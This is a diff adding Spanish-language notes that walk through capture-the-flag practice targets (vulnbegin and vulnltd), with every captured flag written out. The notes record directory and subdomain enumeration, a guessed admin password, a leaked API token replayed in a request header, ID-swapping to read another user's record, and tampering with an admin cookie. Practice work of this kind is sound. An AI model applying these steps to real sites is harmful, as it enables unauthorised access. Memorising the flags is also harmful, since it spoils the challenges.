@@ -1,0 +1,65 @@
+VulnBegin
+	http://www.vulnbegin.co.uk/
+	escaneo directorios
+	http://www.vulnbegin.co.uk/cpadmin/login
+	al ingresar con un usuario cualquiera, da error de usuario. admin es correcto
+	user admin, password 159753
+	[^FLAG^93D7491FB4B054FB5C5AC3E0292BE41C^FLAG^]
+	
+	robots.txt->/secret_d1rect0y/
+	[^FLAG^2B22E2CB70E218510802B0359488F6A2^FLAG^]
+	
+	http://www.vulnbegin.co.uk/cpadmin/env
+	{"api_key":"X-Token: 492E64385D3779BC5F040E2B19D67742","flag":"[^FLAG^F6A691584431F9F2C29A3A2DE85A2210^FLAG^]"}
+	
+	assetfinder vulnbegin.co.uk
+	subdominio v64hss83.vulnbegin.co.uk
+	[^FLAG^047524FE61AE6B5FD1D184994C7322FC^FLAG^]
+	
+	content discovery en v64hss83.vulnbegin.co.uk con X-Token: 492E64385D3779BC5F040E2B19D67742
+	nada
+	sublister vulnbegin.co.uk -> http://server.vulnbegin.co.uk
+	{"error":"User Not Authenticated","flag":"[^FLAG^E858ED9649E57BECE9ACD1A4C60D3446^FLAG^]"}
+	
+	GET / HTTP/1.1
+	Host: server.vulnbegin.co.uk
+	X-Token: 492E64385D3779BC5F040E2B19D67742
+	
+	{"messaged":"User Authenticated","flag":"[^FLAG^0BDC60CC5E283476E7107C814C18DCCF^FLAG^]"}
+	
+	/user 
+	{"id":27,"flag":"[^FLAG^7B3A24F3368E71842ED7053CF1E51BB0^FLAG^]","endpoint":"\/user\/27"}
+	
+	/user/27/info
+	{"id":27,"username":"vulnbuild_website","description":"User for the main website"}
+	
+	/user/5/info
+	{"id":5,"username":"admin","description":"admin for the server","flag":"[^FLAG^3D82BE780F46EE86CE060D23E6E80639^FLAG^]"}
+	
+	dig vulnbegin.co.uk any
+	[^FLAG^BED649C4DB2DF265BD29419C13D82117^FLAG^]
+
+VulnLtd
+	http://www.vulnltd.co.uk
+	robots.txt ->/secr3t_l0g1n/
+	[^FLAG^B14F856BC5AD17151A55F097E1805A01^FLAG^]
+	
+	http://www.vulnltd.co.uk/secr3t_l0g1n/
+	http://www.vulnltd.co.uk/secr3t_l0g1n/docs
+	"rename /admin folder"
+	You will also be given a guest account with the username "guest" and the password will be the day of the week the software was installed
+	guest/tuesday
+	[^FLAG^F01EF758672F38E8C7BF41B0AD1BB431^FLAG^]
+	
+	editar una pagina
+	no permite, dice q solo el admin puede editar
+	modificar la cookie admin=false y poner true
+	editar la pagina 3, no me deja pero obtuve un email
+	start-ticket@vulnltd.co.uk
+	
+	
+	
+	
+	
+	
+	
